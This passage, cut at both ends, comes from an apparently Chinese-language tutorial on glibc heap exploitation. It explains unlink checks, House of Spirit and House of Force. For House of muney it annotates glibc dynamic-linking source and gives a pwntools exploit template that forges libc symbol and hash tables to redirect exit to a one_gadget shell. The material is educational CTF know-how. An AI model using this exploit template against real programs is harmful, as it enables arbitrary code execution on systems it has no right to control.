class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure><p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p><p>高版本的 <code>unlink</code> 的条件是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))  <span class="comment">//new</span></span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p><h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li><li>结合其他方法进行任意地址读写</li></ul><h2 id="House-of-muney"><a href="#House-of-muney" class="headerlink" title="House of muney"></a>House of muney</h2><h3 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h3><ul><li><code>2.23</code>—— 至今</li></ul><p>这里分析函数延迟绑定机制中写入真实地址的过程</p><p>首先<code>push n;push m;jmp _dl_runtime_resolve_xsavec;</code></p><blockquote><p>n是函数在.rela.plt的位置</p><p>m是codebase</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;: endbr64</span><br><span class="line">   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;:       push   rbx</span><br><span class="line">   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;:       mov    rbx,rsp</span><br><span class="line">   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;:       and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;:      sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 &lt;_rtld_global_ro+432&gt;</span><br><span class="line">   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fd8d47 &lt;_dl_runtime_resolve_xsavec+23&gt;:      mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fd8d4c &lt;_dl_runtime_resolve_xsavec+28&gt;:      mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x7ffff7fd8d51 &lt;_dl_runtime_resolve_xsavec+33&gt;:      mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x7ffff7fd8d56 &lt;_dl_runtime_resolve_xsavec+38&gt;:      mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">   0x7ffff7fd8d5b &lt;_dl_runtime_resolve_xsavec+43&gt;:      mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x7ffff7fd8d60 &lt;_dl_runtime_resolve_xsavec+48&gt;:      mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x7ffff7fd8d65 &lt;_dl_runtime_resolve_xsavec+53&gt;:      mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8d6a &lt;_dl_runtime_resolve_xsavec+58&gt;:      xor    edx,edx</span><br><span class="line">   0x7ffff7fd8d6c &lt;_dl_runtime_resolve_xsavec+60&gt;:      mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x7ffff7fd8d74 &lt;_dl_runtime_resolve_xsavec+68&gt;:      mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x7ffff7fd8d7c &lt;_dl_runtime_resolve_xsavec+76&gt;:      mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x7ffff7fd8d84 &lt;_dl_runtime_resolve_xsavec+84&gt;:      mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x7ffff7fd8d8c &lt;_dl_runtime_resolve_xsavec+92&gt;:      mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x7ffff7fd8d94 &lt;_dl_runtime_resolve_xsavec+100&gt;:     mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">   0x7ffff7fd8d9c &lt;_dl_runtime_resolve_xsavec+108&gt;:     xsavec [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8da1 &lt;_dl_runtime_resolve_xsavec+113&gt;:     mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x7ffff7fd8da5 &lt;_dl_runtime_resolve_xsavec+117&gt;:     mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x7ffff7fd8da9 &lt;_dl_runtime_resolve_xsavec+121&gt;:     call   0x7ffff7fd5e70 &lt;_dl_fixup&gt;</span><br><span class="line">   0x7ffff7fd8dae &lt;_dl_runtime_resolve_xsavec+126&gt;:     mov    r11,rax</span><br><span class="line">   0x7ffff7fd8db1 &lt;_dl_runtime_resolve_xsavec+129&gt;:     mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8db6 &lt;_dl_runtime_resolve_xsavec+134&gt;:     xor    edx,edx</span><br><span class="line">   0x7ffff7fd8db8 &lt;_dl_runtime_resolve_xsavec+136&gt;:     xrstor [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8dbd &lt;_dl_runtime_resolve_xsavec+141&gt;:     mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x7ffff7fd8dc2 &lt;_dl_runtime_resolve_xsavec+146&gt;:     mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x7ffff7fd8dc7 &lt;_dl_runtime_resolve_xsavec+151&gt;:     mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x7ffff7fd8dcc &lt;_dl_runtime_resolve_xsavec+156&gt;:     mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x7ffff7fd8dd1 &lt;_dl_runtime_resolve_xsavec+161&gt;:     mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x7ffff7fd8dd6 &lt;_dl_runtime_resolve_xsavec+166&gt;:     mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x7ffff7fd8ddb &lt;_dl_runtime_resolve_xsavec+171&gt;:     mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8ddf &lt;_dl_runtime_resolve_xsavec+175&gt;:     mov    rsp,rbx</span><br><span class="line">   0x7ffff7fd8de2 &lt;_dl_runtime_resolve_xsavec+178&gt;:     mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8de6 &lt;_dl_runtime_resolve_xsavec+182&gt;:     add    rsp,0x18</span><br><span class="line">   0x7ffff7fd8dea &lt;_dl_runtime_resolve_xsavec+186&gt;:     jmp    r11</span><br></pre></td></tr></table></figure><p>保存工作状态，然后<code>jmp r11，即jmp _dl_fixup</code></p><p>一下分析<code>_dl_fixup</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">   first time each PLT entry is called.  We must perform the relocation</span></span><br><span class="line"><span class="comment">   specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">   function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">   to that address.  Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">   function.  */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, <span class="built_in">ElfW</span>(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 这里的l是二进制程序本身的link_map，而不是so的</span></span><br><span class="line">  <span class="comment">// 第一个参数是上面的m，即codebase，第二个参数是上述的n，即.rela.plt的偏移</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表</span></span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 找到对应的重定位元素、符号表、字符串</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (<span class="built_in">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="comment">// rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中</span></span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  <span class="built_in">assert</span> (<span class="built_in">ELFW</span>(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (<span class="built_in">ELFW</span>(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">r_found_version</span> *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)]);</span><br><span class="line">  <span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">THREAD_GSCOPE_SET_FLAG</span> ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 第一个参数是字符串地址，根据符号表和字符串表得到的</span></span><br><span class="line"><span class="comment">// 第二个参数是link_map</span></span><br><span class="line"><span class="comment">// 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表</span></span><br><span class="line"><span class="comment">// 第四个参数是scope，表示查找的范围</span></span><br><span class="line"><span class="comment">// 第五个参数是版本信息</span></span><br><span class="line"><span class="comment">// 后面的参数都是固定的</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line"><span class="built_in">THREAD_GSCOPE_RESET_FLAG</span> ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (result,</span><br><span class="line">   <span class="built_in">SYMBOL_ADDRESS</span> (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (l, <span class="built_in">SYMBOL_ADDRESS</span> (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = <span class="built_in">elf_machine_plt_value</span> (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (<span class="built_in">ELFW</span>(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = <span class="built_in">elf_ifunc_invoke</span> (<span class="built_in">DL_FIXUP_VALUE_ADDR</span> (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">// 修正got表条目</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">elf_machine_fixup_plt</span> (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只了解了大概流程</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><code>ptmalloc</code> 堆分配器在分配超大内存 <code>&gt; 128K</code> 的时候，会调用 <code>mmap</code> 申请系统内存，此时申请到的内存一般位于 <code>libc.so.6</code> 映射的内存地址的低地址处。<code>house of muney</code> 的核心在于修改 <code>mmap</code> 内存的 <code>size</code> 大小，使其能把 <code>libc.so.6</code> 的符号表、哈希表等数据所在的地址空间也释放掉。然后再把这一片空间给申请回来，就能伪造符号表、哈希表，那么在解析函数实际地址的时候就能控制其解析为任意地址，进而控制程序执行流。</p><ol><li><code>A = mmap(addr=NULL, length=0x1000,...)</code></li><li>修改 <code>A</code> 的 <code>size</code>，为 <code>0x1000 + XXX</code></li><li><code>free(A)</code>，实际执行的是：<code>munmap(A, 0x1000 + XXX)</code>，就可以偷取 <code>glibc</code> 的内存</li><li><code>mmap(addr=NULL, length=0x1000 + XXX, ... )</code>，然后输入数据，就可以控制 “偷去” 的内存的内容</li><li>在进行符号解析的时候，进行任意函数调用</li></ol><p>需要伪造的结构有：</p><ol><li><strong>bitmask_word</strong></li><li><strong>bucket</strong></li><li><strong>hasharr</strong>，需要多伪造几个，并不是第一个就满足条件</li><li><strong>target symbol -&gt;st_value</strong>，符号表中，除了st_value修改为目标地址外，其他成员建议保持不变</li></ol><p>简单来说，就是伪造符号表，让初次调用funcA时的真实地址，解析成funcB达到任意代码执行的效果</p><p>给出模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)   </span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>, -<span class="number">8</span>, p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))  <span class="comment">#修改size，以让mmap可以申请到libc段上的空间（malloc过大的chunk会重新申请一个段来存储chunk，该段与libc接近）</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Prepare offsets and gadgets</span></span><br><span class="line">base_off = <span class="number">0x7dff0</span>                           <span class="comment">#mmap段与libc_base的差值</span></span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Calculate hash and offsets</span></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = <span class="built_in">int</span>(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Prepare the new symbol entry for `exit`</span></span><br><span class="line">sym_value = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">b&#x27;exit\x00&#x27;</span>).__next__() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name </span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value  #目标地址----------------------</span></span><br><span class="line">sym_value += p64(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Edit the heap to overwrite the hash table and symbol table</span></span><br><span class="line">edit(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + hasharr_off, p32(namehash))</span><br><span class="line">edit(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment"># Step 6: Trigger the exploit</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;option:&quot;</span>, <span class="string">b&quot;5&quot;</span>)   <span class="comment">#首次调用exit函数</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li></ul><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p><ul><li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li><li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li><li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li></ul><h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p><h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li></ul><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写 <code>top_chunk</code></p><h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.28</code></li><li>可分配任意大小的 <code>chunk</code></li><li>需要泄露或已知地址</li></ul><h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>对 <code>top_chunk</code> 的利用，过程如下：</p><ul><li>申请 <code>chunk A</code></li><li>写 <code>A</code> 的时候溢出，修改 <code>top_chunk</code> 的 <code>size</code> 